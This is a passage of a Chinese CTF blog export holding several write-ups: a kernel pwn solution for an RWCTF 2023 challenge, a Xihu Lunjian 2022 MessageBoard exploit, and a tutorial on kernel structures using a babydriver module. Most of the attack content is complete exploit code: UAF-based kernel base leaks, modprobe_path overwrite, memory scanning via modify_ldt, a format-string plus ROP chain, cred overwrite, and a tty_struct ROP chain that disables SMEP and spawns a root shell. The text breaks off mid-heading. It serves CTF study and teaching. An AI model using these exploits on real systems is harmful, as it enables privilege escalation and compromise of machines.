((msgctl(msqid,cmd,buf))==-1)                        // 删除队列 msg_msgctl(msqid,IPC_RMID,NULL);\n    {\n        perror(\"Msgctl\");\n        exit(-1);\n    }\n}\n\nvoid create_shm_file_data()\n{\n    int shmid;\n    if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) {\n      perror(\"shmget\");\n      exit(0);\n    }\n    char *shmaddr = shmat(shmid, NULL, 0);\n    if (shmaddr == (void*)-1) {\n      perror(\"shmat\");\n      exit(0);\n    }\n}\n\nvoid leak(){\n    char* buf = malloc(OBJSIZE);\n    memset(buf,'a',OBJSIZE);\n    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);             // 1\n    rwctf_ioctl_kfree(0);                           // 2\n\n    struct g_msgp msgp;\n    msgp.type = 1;   \n    memset(msgp.mtext,'a',0xfe8);\n    g_msqid = msg_msgget(IPC_PRIVATE,IPC_CREAT|0666);\n    msg_msgsnd(g_msqid,&msgp,sizeof(msgp.mtext),0);         // 3\n    \n    rwctf_ioctl_kfree(0);          // 4                         \n  \n    create_shm_file_data();         // 5\n\n    char* recv_msg = malloc(0x1000);\n    msg_msgrcv(g_msqid,recv_msg,0x1000,0,IPC_NOWAIT|MSG_NOERROR);           // 6\n    // hexdump(recv_msg,0x1000);\n\n    g_kernel_base = *(int64_t *)&recv_msg[0xfd8] - 0x19ac6c0;\n    printf(\"[+] kernel base is : 0x%lx\\n\",g_kernel_base);\n\n    free(buf);\n    free(recv_msg);\n\n}\n\nint main(){\n    g_fd = open(\"/dev/rwctf\",2);       // #define O_RDWR      00000002  \n\n    prepare();                          // 1. prepare /tmp/x & /tmp/dummy, then wait 3s to exec /tmp/dummy\n    leak();                             // 2. leak kernel base\n\n    int64_t target_addr = modprobe_path_addr - kernel_elf_base + g_kernel_base;\n    printf(\"[+] modprobe_path addr: 0x%lx\\n\",target_addr);\n    char* target_cont_p = malloc(OBJSIZE);\n    memset(target_cont_p,'y',OBJSIZE);  \n    memcpy(target_cont_p,\"/tmp/x\\x00\",0x7);            \n    aaw(&target_addr,target_cont_p);            // 3. use aaw() to overwrite modprobe_path\n\n    return 0;\n}\n```\n\n\n\n# 利用方法3\n\n第三种方法算是一种非预期解（另外几种非预期解：/init权限；qemu启动参数-monitor未重定向到/dev/null），非预期本质原因，是题目使用了initrd作为根文件系统。initrd文件系统启动过程中会被加载到内存中并常驻，而flag的内容就存放在其中。\n\n本题解法可概括成一句话：利用modify_ldt系统调用和UAF漏洞，实现任意内核地址的信息泄露，然后在direct mapping area搜索flag字符串。\n\n利用总体思路如下：\n\n1. 确定page_offset_base的值（nokaslr时是0xffff888000000000 ，开启kaslr时需暴破）\n2. 遍历direct mapping area，找到flag字符串所在的地址\n3. 读取flag字符串\n\n## exp\n\n```c\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/ioctl.h>\n#include <sys/syscall.h>\n#include <asm/ldt.h> \n#include <sys/mman.h>\n\n#define OBJSIZE 0x10\n\nint g_fd;\nint64_t g_flag_addr = -1;\nint64_t page_offset_base = 0xffff888000000000;\n\nstruct rwstruct{\n    unsigned int idx;\n    unsigned int size;\n    char* cont;\n};\n\nint rwctf_ioctl_kmalloc(int idx, int size, char* cont){\n    struct rwstruct rw_buf;\n    rw_buf.idx = idx;\n    rw_buf.size = size;\n    rw_buf.cont = cont;\n    ioctl(g_fd,0xDEADBEEF,&rw_buf);\n}\n\nint rwctf_ioctl_kfree(int idx){\n    struct rwstruct rw_buf;\n    rw_buf.idx = idx;\n    rw_buf.size = 0;\n    rw_buf.cont = 0;\n    ioctl(g_fd,0xC0DECAFE,&rw_buf);\n}\n\nvoid kmalloc_ldt_struct(){\n    struct user_desc desc;\n    int retval = -2;\n\n    /* init descriptor info */\n    desc.base_addr = 0xff0000;\n    desc.entry_number = 0x8000 / 8;\n    desc.limit = 0;\n    desc.seg_32bit = 0;\n    desc.contents = 0;\n    desc.limit_in_pages = 0;\n    desc.lm = 0;\n    desc.read_exec_only = 0;\n    desc.seg_not_present = 0;\n    desc.useable = 0;\n\n    retval = syscall(SYS_modify_ldt, 1, &desc, sizeof(struct user_desc));\n}\n\nint main(){\n    g_fd = open(\"/dev/rwctf\",2); \n    int retval = -2;\n\n    char* buf = malloc(OBJSIZE);\n    memset(buf,'a',OBJSIZE);\n    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);\n    rwctf_ioctl_kfree(0);\n\n    kmalloc_ldt_struct();\n    \n// 1. leaking page_offset_base\n    while(1){\n        rwctf_ioctl_kfree(0);\n        *(int64_t *)buf = page_offset_base;\n        *((int64_t *)buf+1) = 0x8000 / 8;\n        rwctf_ioctl_kmalloc(0,OBJSIZE,buf);\t\t// 改掉*entries，指向page_offset_base\n        int64_t testing_buf = 0;\n        retval = syscall(SYS_modify_ldt, 0, &testing_buf, 0x8);\n        if(retval > 0){\n            break;\t\t\t\t\t// 读取到内容，说明触及到了起始边界\n        }else if(retval == 0){\n            printf(\"no mm->context.ldt!\");\n            exit(-1);\n        }\n        page_offset_base += 0x10000000; \n    }\n    printf(\"[+] leaked page_offset_base : 0x%lx\\n\",page_offset_base);\n\n// 2. searching\n    int64_t searching_addr = page_offset_base;\n    char* recv_buf = (char*) mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);              // prepare user buffer\n    while(1){\n        rwctf_ioctl_kfree(0);\n        *(int64_t *)buf = searching_addr;\n        *((int64_t *)buf+1) = 0x8000 / 8;\n        rwctf_ioctl_kmalloc(0,OBJSIZE,buf);     // set *entries to be the target address\n\n        retval = syscall(SYS_modify_ldt, 0, recv_buf, 0x8000);         \n        char*  ret_addr = memmem(recv_buf,0x8000,\"rwctf{\",6);\t\t// memmem用于匹配二进制串，strstr用于匹配字符串\n        if(ret_addr != 0){\n            for(int i = 0 ; i < 50; i++){\n                if(ret_addr[i] == '}'){             // 不仅要前几个字符\"rwctf{\"匹配，还需要匹配'}'\n                    g_flag_addr = searching_addr + ((int64_t)ret_addr - (int64_t)recv_buf);\n                    break;\n                }\n            } \n            printf(\"[+] Found 'flag{' at addr: 0x%lx\\n\", searching_addr + ((int64_t)ret_addr - (int64_t)recv_buf));\n        }\n        if(g_flag_addr != -1) break;\n        searching_addr += 0x8000;\n    }\n\n// 3. read flag\n    char* flag = malloc(0x50);      // 获得flag在direct mapping area的地址后，用任意地址读，将flag读出即可\n    rwctf_ioctl_kfree(0);\n    *(int64_t *)buf = g_flag_addr;\n    *((int64_t *)buf+1) = 0x8000 / 8;\n    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);\n\n    retval = syscall(SYS_modify_ldt, 0, flag, 0x50);\n    printf(\"flag: %s\\n\",flag);\n    return 0;\n}\n```\n\n以上是我根据参考exp精简后的利用脚本。\n\n参考的exp中，说为了绕过config_hardened_usercopy这个选项，使用了fork子进程的方法来泄露内核地址。但是我写exp的过程中，发现不考虑这个选项也能做出来。甚至我有点怀疑这个安全选项有没有打开，因为我读内核代码段时内核不会崩溃，写内核代码段才会崩溃。可是暂时还不知道怎么通过bzImage确定安全选项是否打开。\n\n\n\n## 进一步探索：泄露内核基址\n\n上面直接用内存搜索的方法找到了flag，其实想想，用同样的方法也能探测出内核基址。\n\n| 区域                                  | 起始地址              | 最大偏移（猜测） |\n| ------------------------------------- | --------------------- | ---------------- |\n| direct mapping of all physical memory | 0xffff 8880 0000 0000 | 0xfff f000 0000  |\n| kernel text mapping                   | 0xffff ffff 8000 0000 | 0xfff0 0000      |\n\n探测内核基址：从linux分配的0xffffffff80000000这个地址开始，以0x100000为间隔，进行探测，第一个可访问的点，就是内核加载基址。\n\n代码如下：\n\n```c\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/ioctl.h>\n#include <sys/syscall.h>\n#include <asm/ldt.h> \n#include <sys/mman.h>\n\n#define OBJSIZE 0x10\n\nint g_fd;\nint64_t g_flag_addr = -1;\nint64_t kernel_text_base = 0xffffffff80000000;\n\nstruct rwstruct{\n    unsigned int idx;\n    unsigned int size;\n    char* cont;\n};\n\nint rwctf_ioctl_kmalloc(int idx, int size, char* cont){\n    struct rwstruct rw_buf;\n    rw_buf.idx = idx;\n    rw_buf.size = size;\n    rw_buf.cont = cont;\n    ioctl(g_fd,0xDEADBEEF,&rw_buf);\n}\n\nint rwctf_ioctl_kfree(int idx){\n    struct rwstruct rw_buf;\n    rw_buf.idx = idx;\n    rw_buf.size = 0;\n    rw_buf.cont = 0;\n    ioctl(g_fd,0xC0DECAFE,&rw_buf);\n}\n\nvoid kmalloc_ldt_struct(){\n    struct user_desc desc;\n    int retval = -2;\n\n    /* init descriptor info */\n    desc.base_addr = 0xff0000;\n    desc.entry_number = 0x8000 / 8;\n    desc.limit = 0;\n    desc.seg_32bit = 0;\n    desc.contents = 0;\n    desc.limit_in_pages = 0;\n    desc.lm = 0;\n    desc.read_exec_only = 0;\n    desc.seg_not_present = 0;\n    desc.useable = 0;\n\n    retval = syscall(SYS_modify_ldt, 1, &desc, sizeof(struct user_desc));\n}\n\nint main(){\n    g_fd = open(\"/dev/rwctf\",2); \n    int retval = -2;\n\n    char* buf = malloc(OBJSIZE);\n    memset(buf,'a',OBJSIZE);\n    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);\n    rwctf_ioctl_kfree(0);\n\n    kmalloc_ldt_struct();\n    \n// 1. leaking kernel_text_base\n    while(1){\n        rwctf_ioctl_kfree(0);\n        *(int64_t *)buf = kernel_text_base;\n        *((int64_t *)buf+1) = 0x8000 / 8;\n        rwctf_ioctl_kmalloc(0,OBJSIZE,buf);\n        int64_t testing_buf = 0;\n        retval = syscall(SYS_modify_ldt, 0, &testing_buf, 0x8);\n        if(retval > 0){\n            break;\n        }else if(retval == 0){\n            printf(\"no mm->context.ldt!\");\n            exit(-1);\n        }\n        kernel_text_base += 0x100000; \n    }\n    printf(\"[+] leaked kernel_base : 0x%lx\\n\",kernel_text_base);\n\n    system(\"/bin/sh\");\n}\n```\n\n![image-20230214220058272](image-20230214220058272.png?size=600)\n\n\n\n## 其他疑问\n\n### initrd（INIT RamDisk）\n\n> The *initial RAM disk (initrd)* is an initial root file system that is mounted prior to when the real root file system is available. \n>\n> ​\t\t\t- 摘自 [What's an initial RAM disk?](https://developer.ibm.com/articles/l-initrd/)\n\ninitrd是一种初始根文件系统，在启动过程中它会被加载到内存中，它可以当作临时根文件系统，用它加载并挂载真正的根文件系统。[这篇文章](https://blog.csdn.net/xiehaihit/article/details/91959216) 可以了解到initrd的由来，[这篇文章](https://www.baeldung.com/linux/initrd-vs-initramfs) 了解initrd和initramfs的共同点和区别。\n\nlinux kernel pwn中，常见到将initrd作为根文件系统的场景，带来便利性的同时也引入了一个问题：文件系统的所有内容都在内存中（包括flag）。而64位架构下，所有的物理地址都会映射到`direct mapping of all physical memory`区域（0xffff888000000000 ~ 0xffffc87fffffffff，64TB）。也就是说通过搜索该区域就能找到flag内容。\n\n### malloc和mmap的区别\n\n在写内核利用的exp时，看到别人的代码里申请大内存都是用mmap，而我习惯性地用malloc去申请。测试了一下两者在利用时都能成功，所以好奇它们究竟有什么区别，导致其他人都用mmap。\n\n看了[文章](https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-3-9890b01d56a2)及一些讨论过后，决定以后我也要用mmap，总结如下两个点：\n\n- 一方面，使用mmap的话，更直接一些。申请大内存时，malloc中其实也是去调用了mmap。\n- 另一方面，可以避免glibc操作中的干扰，因为不清楚glibc封装地函数中做了什么操作，是否会出现什么未知问题。\n\n\n\n### 绕过hardened_usercopy\n\n- fork绕过copy_to_user检查的原理？\n\n  fork()时，`ldt_struct` 及 `ldt_struct->entries` 指向的内容，都会在内核中复制一份\n\n  ```c\n  sys_fork()\n      kernel_clone()\n          copy_process()\n              copy_mm()\n                  dup_mm()\n                      dup_mmap()\n                          arch_dup_mmap()\n                              ldt_dup_context()\n  \n  int ldt_dup_context(struct mm_struct *old_mm, struct mm_struct *mm)\n  {\n      //...\n  \n      memcpy(new_ldt->entries, old_mm->context.ldt->entries,\n             new_ldt->nr_entries * LDT_ENTRY_SIZE);\n  \n         //...\n  }\n  // in arch/x86/kernel/ldt.c\n  ```\n\n  \n\n- 子进程中搜索字符串，需要将字符串地址传回给父进程\n\n  采用pipe进程间通信的方式传递信息\n\n\n\n# 参考文章\n\n利用方法1：[第五届 Real World CTF 体验赛 Writeup](https://mp.weixin.qq.com/s/PHdDA0iQXm7e8aByHdxcQA)\n\n利用方法2：[2023 RWCTF体验赛 SU Writeup](https://su-team.cn/passages/2023-01-10-RWCTF/)\n\n利用方法3：[RWCTF2023体验赛 write up for Digging into kernel 3](https://meteorpursuer.github.io/2023/02/05/RWCTF2023_Digging_into_kernel3_wp/)\n\n[开启内核地址随机化KASLR后, qemu 调试 kernel 不能设置断点](https://blog.csdn.net/gatieme/article/details/104266966)\n\n```\n方法1：在qemu启动命令行中，添加nokaslr\n方法2：找到内核加载的基址，指定vmlinux加载到基址处\n```\n\n\n\n\n\n# 一些操作\n\n\n\n## 精简ELF\n\n写kernel pwn利用程序时，使用gcc静态编译的文件比较大，上传到远程服务器时比较耗时。为了减小文件大小，可以使用musl libc或者uclibc来编译。\n\n以musl libc为例，简单讲一下怎么使用。\n\n- 首先，在 [musl libc官网](https://musl.libc.org/) 下载源码包，然后进源码目录编译生成`musl-gcc`二进制。\n\n  ```bash\n  wget https://musl.libc.org/releases/musl-1.2.3.tar.gz\n  tar -xzf ./musl-1.2.3.tar.gz\n  cd musl-1.2.3\n  ./configure && sudo make install -j `nproc`\n  ```\n\n- 然后，就可以用`musl-gcc`编译c文件了，用法同`gcc`。\n\n  ```bash\n  musl-gcc -static -masm=intel exp.c -o exp\n  ```\n\n## 上传脚本\n\n做kernel pwn题时，通常需要上传一个编译好的二进制程序到服务器中。在没有ssh的情况下，通常是通过分段编码（base64）的方式，将文件传到服务器中。\n\n上传的操作可以封装成一个简单的python函数，代码如下\n\n```python\nfrom pwn import *\n\nch = b'/ $ '\t# 根据题目情况更改\n\n# io = remote(\"192.168.1.207\",10023)\n# io.sendlineafter(b\"buildroot login: \",b\"root\")\n# io.sendlineafter(ch,b\"ls\")\n\nio = process(['/bin/bash','./praymoon/run.sh'])\n\ndef upload(lname, rname):\n    print(\"[*] uploading %s ...\" % lname)\n    payload = b64e(open(lname,'rb').read())\n    a = len(payload) // 500\n    for i in range(a + 1):\n        print(\"[+] %d/%d\" % (i,a))\n        s = 'echo \"' + payload[i*(500):(i+1)*500] + '\" >> %s.b64' % rname\n        io.sendlineafter(ch,s.encode('utf-8'))\n    cmd = 'cat %s.b64 | base64 -d > %s' % (rname,rname)\n    io.sendlineafter(ch,cmd.encode('utf-8'))\n\n\nio.sendline(\"ls\")    \nupload(\"./test\",\"/tmp/test\")        # 示例用法\ncontext(log_level='debug')\nio.sendlineafter(ch,b\"chmod +x /tmp/test\")\nio.sendlineafter(ch,b\"/tmp/test\")\nio.interactive()\n#io.sendlineafter(\"/ # \",b\"cat /flag\")\n\n# while 1:\n#     t = io.recvline()\n#     print(t.replace(b\"\\r\",b'').decode('utf-8'))\n#     io.send(input().encode('utf-8'))\n\n```\n\n## 内存dump\n\n调试堆喷的时候，经常需要dump内存，所以找了两个封装好的函数。前一个代码量小，只是简单将内存中的数据打印出来。后一个还对每行数据做了offset的标记，并将可显示字符打印出来，类似010editor的效果。\n\n- 简单版\n\n  ```c\n  void debug(char * buf,int len){\n      for(int i=0;i<len;i++){\n          if((i%8==0)  && (i!=0)) printf(\"  \");\n          if((i%16==0) && (i!=0)) printf(\"\\n\");\n          printf(\"%02X \",buf[i] & 0xff);\n      }\n      printf(\"\\n\");\n  }\n  ```\n\n  \n\n- 详细版\n\n  ```c\n  #ifndef HEXDUMP_COLS\n  #define HEXDUMP_COLS 16\n  #endif\n  \n  void hexdump(void *mem, unsigned int len) {\n      putchar('\\n');\n      for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {\n          /* print offset */\n          if(i % HEXDUMP_COLS == 0) {\n              printf(\"0x%06x: \", i);\n          }\n  \n          /* print hex data */\n          if(i < len) {\n              printf(\"%02x \", 0xFF & ((char*)mem)[i]);\n          }\n          /* end of block, just aligning for ASCII dump */\n          else {        \n              printf(\"   \");\n          }\n  \n          /* print ASCII dump */\n          if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {\n              for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {\n                   /* end of block, not really printing */\n                  if(j >= len) {\n                      putchar(' ');\n                  }\n                  /* printable char */\n                  else if(isprint(((char*)mem)[j])) {\n                      putchar(0xFF & ((char*)mem)[j]);\n                  }\n                   /* other char */\n                  else {\n                      putchar('.');\n                  }\n              }\n              putchar('\\n');\n          }\n      }\n      putchar('\\n');\n  }\n  ```\n\n  \n\n\n\n\n\n# 其他利用方法\n\n## USMA\n\n[blackhat - USMA: Share Kernel Code with Me](https://i.blackhat.com/Asia-22/Thursday-Materials/AS-22-YongLiu-USMA-Share-Kernel-Code.pdf)\n\n[USMA:用户态映射攻击](https://paper.seebug.org/1916/)\n\n## DirtyCred\n\n[DirtyCred: Escalating Privilege in Linux Kernel](https://zplin.me/papers/DirtyCred.pdf)\n\n[Cautious! A New Exploitation Method! No Pipe but as Nasty as Dirty Pipe](https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf)\n\n[简单介绍 - Dirty Cred: What You Need to Know](https://www.rezilion.com/blog/dirty-cred-what-you-need-to-know/)\n\n[DirtyCred官方示例](https://github.com/Markakd/DirtyCred)\n\n","categories":["CTF"]},{"title":"西湖论剑 2022 PWN MessageBoard","url":"/2023/02/04/230204-xhlj2022-messageboard/","content":"\n\n\n# 分析及利用\n\n[题目附件](MessageBoard.zip)\n\n分析：\n\n1. 格式化字符串漏洞泄露栈和libc的地址\n2. 缓冲区写溢出实现控制流劫持\n3. rip被劫持时rbp可控，故通过两次`leave;ret;`劫持rsp\n4. rop链执行orw读取并打印flag（本题通过seccomp禁用了execve系统调用）\n\n完整exp如下\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./pwn\")\nmylibc = ELF(\"./libc.so.6\")\nio = process(myelf.path)\n# io = remote()\n\nio.recvuntil(\"name:\")\n# gdb.attach(io,\"b *0x401367\")  # 0x40138C 0x4013a2 0x401367\n# sleep(3)\nio.send(b\"%31$p%p\")\nio.recvuntil(b\"Hello, 0x\")\nlibc_base = int(io.recv(12),16) - 0x24083\nstack_addr = int(io.recv(14)[2:],16)\nfake_rbp = stack_addr + 0x10\nprint(b\"[+] leak libc_addr: 0x%x\" % libc_base)\nprint(b\"[+] leak stack_addr: 0x%x\" % stack_addr)\nio.recvuntil(b\"DASCTF:\")\n\nopen_addr = libc_base + mylibc.symbols['open']\nread_addr = libc_base + mylibc.symbols['read']\nwrite_addr = libc_base + mylibc.symbols['write']\nprint(b\"[+] open addr : 0x%x\" % open_addr)\n\npop_rdi_ret = p64(libc_base + 0x23b6a)\npop_rsi_ret = p64(libc_base + 0x2601f)\npop_rdx_ret = p64(libc_base + 0x142c92)\n\naaa = b\"/flag\\x00\\x00\\x00\"    # rbp\naaa += pop_rdi_ret                    # rip\naaa += p64(fake_rbp)\naaa += pop_rsi_ret\naaa += p64(0)\naaa += p64(open_addr)       # open(\"/flag\",0)\naaa += pop_rdi_ret\naaa += p64(3)\naaa += pop_rsi_ret\naaa += p64(0x4040B0)\naaa += pop_rdx_ret\naaa += p64(100)\naaa += p64(read_addr)       # read(3,0x4040B0,100)\naaa += pop_rdi_ret\naaa += p64(1)\naaa += pop_rsi_ret\naaa += p64(0x4040B0)\naaa += pop_rdx_ret\naaa += p64(100)\naaa += p64(write_addr)      # write(1,0x4040B0,100)\naaa += p64(401150)          # start func\n\npayload =  aaa + b\"a\"*(176 - len(aaa)) + p64(fake_rbp) + p64(0x4013A2)\nio.send(payload)\n\nio.interactive()\n```\n\n\n\n# seccomp\n\n[pwn -- 沙盒机制详解](https://blog.csdn.net/A951860555/article/details/116738676)\n\n[PWN题中常见的seccomp绕过方法](https://www.anquanke.com/post/id/219077)\n\n","categories":["CTF"]},{"title":"一个题掌握linux内核pwn常用结构体","url":"/2023/01/10/23-01-10-kernel-pwn-useful-struct/","content":"\n\n\n\n\n本文中使用到的结构体汇总如下：\n\n| 结构体/能力     | 控制流劫持 | 泄露堆 | 泄露栈 | 泄露内核地址 |         结构体大小          |\n| :-------------- | :--------: | :----: | :----: | :----------: | :-------------------------: |\n| cred            |     ×      |   √    |   ×    |      ×       |     0xa8 (kmalloc-192)      |\n| tty_struct      |     √      |   √    |   ×    |      √       |    0x2e0 (kmalloc-1024)     |\n| seq_operations  |     √      |   ×    |   ×    |      √       |      0x20 (kmalloc-32)      |\n| subprocess_info |     √      |   √    |   ×    |      √       |     0x60 (kmalloc-128)      |\n| pipe_buffer     |     √      |   ×    |   ×    |      √       |    0x280 (kmalloc-1024)     |\n| shm_file_data   |     ×      |   √    |   ×    |      √       |      0x20 (kmalloc-32)      |\n| msg_msg         |     ×      |   √    |   ×    |      x       | 0x31~0x1000 (>= kmalloc-64) |\n| timerfd_ctx     |     ×      |   √    |   ×    |      √       |     0xf0 (kmalloc-256)      |\n\n除此之外，还介绍了如何利用modprobe_path为程序提权。\n\n\n\n# 环境准备\n\n本文中使用的linux内核版本为4.4.72，挺老的一个版本。为什么使用这个版本呢？首先是因为ctfwiki中第一道内核pwn例题是这个版本，做题时我编了该版本内核。另一个原因是，这个版本的内核防护开的不多，对于仅仅想初步了解内核漏洞利用的常见结构体和方法来说，能省去很多麻烦。因此，本文的部分方法在新版本内核上并不适用。\n\n为了方便复现本文，我将用到的文件都附在这里（也可以根据[上一篇文章](https://blingblingxuanxuan.github.io/2022/12/25/22-12-15-ways-to-debug-linuxkernel/)自己编环境）。\n\n1. [babydriver-env.zip](./babydriver-env.zip) ：运行题目所需的环境\n\n2. [vmlinux.zip](./vmlinux.zip) ：调试时需要用到\n\n3. [babydriver-src.zip](./babydriver-src.zip)：babydriver的源码及Makefile。根据[这道题目](https://blingblingxuanxuan.github.io/2022/08/28/CISCN2017-babydriver/)中babydriver.ko的反汇编结果，仿写了babydriver.ko的源码。并对write函数做了修改，以适应`subprocess_info`的利用。因此，本文不再赘述漏洞分析部分，所有小节直接给出exp源码。\n\n\n\n# cred\n\n## 利用能力\n\n当创建一个新进程时，内核会为其申请一个 [struct cred](https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118) 结构体，用于存放进程信息。以fork创建子进程为例，内核中处理过程如下图所示\n\n![image-20230110002608490](image-20230110002608490.png?size=600)\n\n内核在 [prepare_creds()](https://elixir.bootlin.com/linux/v4.4.72/source/kernel/cred.c#L243) 函数中通过`kmem_cache_alloc()`为 [struct cred](https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118) 结构体申请一段内存空间（0xa8字节大小，对应kmalloc-0xc0）。\n\ncred结构体并不能用于控制流劫持，用作信息泄露的话，某些成员也许能泄露出堆地址，仅此而已。\n\n但是，cred结构保存着fork子进程的权限信息，最常用的做法就是把uid/gid/suid/sgid等全部改成0，使得该子进程拥有root权限。\n\n不过，新版本内核（[kernel4.5及之后的版本](https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/inner-kernel/heap-chunk/?h=gfp#slab_account)）改变了cred的分配方式，正常UAF无法拿到这个结构体。\n\n## babydriver利用示例\n\n```c\n#include<unistd.h>\n#include<stdio.h>\n#include<stdlib.h>\n\nint main(){\n\tint fd1 = open(\"/dev/babydev\",2);\n\tint fd2 = open(\"/dev/babydev\",2);\t\t\t\n\n\tioctl(fd1,0x10001,0xa8);\t\t\t\t\t\n\tclose(fd1);\t\t\t\t\t\t\t\t\t\t\t\t\n\n\tpid_t fpid; \n\tfpid=fork(); \t\t\t\t\t\t\t\n\tif (fpid < 0) {\n\t\tprintf(\"error in fork!\\n\"); \n\t\texit(0);\n\t}else if (fpid == 0) {\n\t\tprintf(\"child pid is : %d\\n\",getpid());\n        char zeros[30] = {0};\n        write(fd2,zeros,28);\t\t\t\t\n\t    if(getuid() == 0){\n\t\t    system(\"/bin/sh\");\t\t\t\t\t\n\t\t    exit(0);\n\t    }\n\t}else {\n\t\twait(NULL);\n\t\tprintf(\"parent pid is: %d\\n\",getpid());\n\t}\n\tprintf(\"%d: going to close fd2\\n\",getpid());\n\tclose(fd2);\t\t\t\t\t\n\n\treturn 0;\n}\n```\n\n\n\n# tty_struct\n\n## 利用能力\n\n### 控制流劫持\n\n当用户态执行`open(\"dev/ptmx\",2);` 或者`open(\"/dev/ptmx\", O_RDWR | O_NOCTTY)`后，内核中的处理过程如下图所示\n\n![image-20230102174602057](image-20230102174602057.png?size=600)\n\n内核在 [alloc_tty_struct()](https://elixir.bootlin.com/linux/v4.4.72/source/drivers/tty/tty_io.c#L3136) 函数中为 [tty_struct](https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/tty.h#L259) 结构体申请一段内存空间（0x2e0字节大小）。\n\n![image-20230102175243655](image-20230102175243655.png?size=600)\n\n`open()`操作后，用户态获得一个文件描述符fd。用户态可对该fd进行 [tty_operations](https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/tty_driver.h#L251) 中包含的所有操作，如write\\ioctl等。\n\n如果利用漏洞改掉tty_struct中ops指向的函数表，就能实现控制流劫持。\n\n### 信息泄露\n\n`tty_struct` 结构体中包含的内容较多：\n\n- 泄露内核基址：tty_operations指向的函数表中有许多函数指针。偏移0x2d0处存放着一个函数指针，指向`do_SAK_work`函数。\n- 泄露堆地址：tty_struct结构体中包含许多链表头节点，存储着堆地址，如下图。\n\n![image-20230102183947631](image-20230102183947631.png?size=600)\n\n\n\n## babydriver利用示例\n\n```c\n// test.c\n// gcc test.c -static -masm=intel  -o test\n#include<unistd.h>\n#include<stdio.h>\n#include<stdlib.h>\n#include <string.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include<errno.h>\n\nsize_t pkc_addr = 0xffffffff81070260;\nsize_t cc_addr = 0xffffffff8106fed0;\nvoid get_root(){\n    char* (*pkc)(int) = pkc_addr;\n    void (*cc)(char*) = cc_addr;\n    (*cc)((*pkc)(0));\n}\n\nvoid get_shell(){\n    system(\"/bin/sh\");\n}\n\nsize_t user_cs, user_rflags, user_sp, user_ss;\nvoid save_status(){\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"[*]status has been saved.\");\n}\n\nint main(){\n    save_status();\n\n    size_t mov_rsp_rax = 0xffffffff818855cf;    // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b\n    size_t pop_rax = 0xffffffff8101c216;        // pop rax; ret; \n    \n    size_t rop_chain[30] = {0};\n    int index = 0;\n    rop_chain[index++] = 0xffffffff8101c216;        // pop rax; ret;\n    rop_chain[index++] = 0x6f0;\n    rop_chain[index++] = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret \n    rop_chain[index++] = 0x0;\n    rop_chain[index++] = (size_t)get_root;\n    rop_chain[index++] = 0xffffffff81885588;        // swapgs; ret \n    rop_chain[index++] = 0xffffffff81884177;        // iretq; \n    rop_chain[index++] = (size_t)get_shell;\n    rop_chain[index++] = user_cs;\n    rop_chain[index++] = user_rflags;\n    rop_chain[index++] = user_sp;\n    rop_chain[index++] = user_ss;\n\n    size_t tty_operations_fake[30];\n    for(int j=0;j<30;j++){\n        tty_operations_fake[j]=mov_rsp_rax;   \n    }\n\n    int fd1 = open(\"/dev/babydev\",2);\n    int fd2 = open(\"/dev/babydev\",2);\n\n    ioctl(fd1,0x10001,0x2e0);\n    close(fd1);\n\n    int fd_tty = open(\"dev/ptmx\",O_RDWR | O_NOCTTY);\n    if(fd_tty < 0){\n        printf(\"[+] cannot open /dev/ptmx\\n\");\n        printf(\"[+] ptmx errorno: %d\\n\",errno);\n        goto exit;\n    }\n\n    size_t tty_struct_leak[4];\n    read(fd2,tty_struct_leak,32);\n    \n    tty_operations_fake[0] = pop_rax;\n    tty_operations_fake[1] = (size_t)rop_chain;\n    tty_operations_fake[2] = mov_rsp_rax;\n\n    tty_struct_leak[3] = (size_t)tty_operations_fake;\n    write(fd2,tty_struct_leak,32);\n\n    size_t a[4] = {0,0,0,0};\n    write(fd_tty,a,32);\n    // ioctl(fd_tty,0x100,32);\nexit:\n    close(fd2);\n\treturn 0;\n}\n```\n\n\n\n## 遇到一个问题\n\n执行exp时遇到的问题：`can't open '/dev/ptmx':  No space left on device`。\n\n没找到跟我的问题一模一样的博主，但是找到一个博主遇到打不开这个文件的问题，试了下它的方法，竟然也可以解决我的问题。\n\n[linux kernel pwn 劫持tty结构体 打不开/dev/ptmx文件（一）](https://blog.csdn.net/yongbaoii/article/details/123924737?spm=1001.2014.3001.5502)\n\n[linux kernel pwn 劫持tty结构体 打不开/dev/ptmx文件（二）](https://blog.csdn.net/yongbaoii/article/details/124025614?spm=1001.2014.3001.5502)\n\n解决方法：在linux的`/init`文件中添加如下两行\n\n```bash\nmkdir -p /dev/pts\nmount -vt devpts -o gid=4,mode=620 none /dev/pts\n```\n\n\n\n# seq_operations\n\n## 利用能力\n\n### 